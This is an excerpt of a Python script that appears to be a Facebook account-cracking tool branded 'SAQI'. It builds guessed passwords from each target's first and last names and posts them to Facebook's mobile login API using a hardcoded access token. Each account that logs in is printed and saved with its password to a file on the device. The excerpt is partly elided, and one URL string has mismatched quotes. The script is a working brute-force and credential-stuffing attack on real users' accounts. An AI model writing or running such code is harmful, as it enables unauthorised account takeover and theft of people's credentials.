...
\033[1;97m Version       :\033[1;92m Tiral \033[1;97m
    ...
    def start2(user):
      ...
      try:
        ...
        for pword in totalpass:
            ...
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid":'f4aece78-46a8-49df-aecf-def597c4c765',"format": "json","device_id":'9aa12656-54b7-46f1-bfa5-1e18069f7c80',"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"6628568379|c1e620fa708a1d5696fb991c1bde5662","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login",data=data,headers=headers)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSAQI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SAQI-OK.txt','a').write(f'{acc} • {pword}\n')
